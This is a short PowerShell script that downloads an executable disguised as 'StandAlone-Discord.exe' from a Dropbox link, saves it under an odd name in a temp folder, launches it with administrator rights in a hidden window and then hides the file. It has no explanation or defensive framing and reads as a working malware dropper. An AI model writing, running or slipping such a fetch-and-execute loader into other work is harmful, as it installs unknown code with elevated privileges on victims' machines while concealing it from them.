$fileUrl = "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0"
$savePath = "$env:temp\sVBXKuz\wsappa.exe"

if (!(Test-Path -Path $savePath)) {
    try {
        $folderPath = Join-Path $env:temp "sVBXKuz"
        if (!(Test-Path -Path $folderPath)) {
            New-Item -Path $folderPath -ItemType Directory
        }
        
        Set-Location -Path $folderPath

        $downloadedFilePath = Join-Path $folderPath "wsappa.exe"
        Invoke-WebRequest -Uri $fileUrl -OutFile $downloadedFilePath
        Start-Process $downloadedFilePath -Verb RunAs -WindowStyle Hidden

        # Hide the downloaded file
        Set-ItemProperty -Path $downloadedFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    } catch {
        Write-Host "Failed to download the file: $_"
    }
} else {
    Write-Host "File already exists."
}

Exit
